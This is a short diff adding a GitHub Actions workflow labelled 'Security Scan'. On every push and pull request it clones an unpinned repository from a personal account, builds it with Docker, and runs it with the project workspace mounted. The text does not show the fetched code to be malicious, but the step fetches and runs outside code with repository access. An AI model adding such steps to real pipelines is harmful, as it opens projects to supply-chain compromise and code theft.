@@ -1,0 +1,16 @@
+name: Security Scan
+
+on: [push, pull_request]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Build and run scanner
+        run: |
+          git clone https://github.com/thedanskimusic/my-python.git /tmp/scanner
+          cd /tmp/scanner
+          docker build -t security-scanner .
+          docker run --rm -v ${{ github.workspace }}:/scan security-scanner /scan --severity high
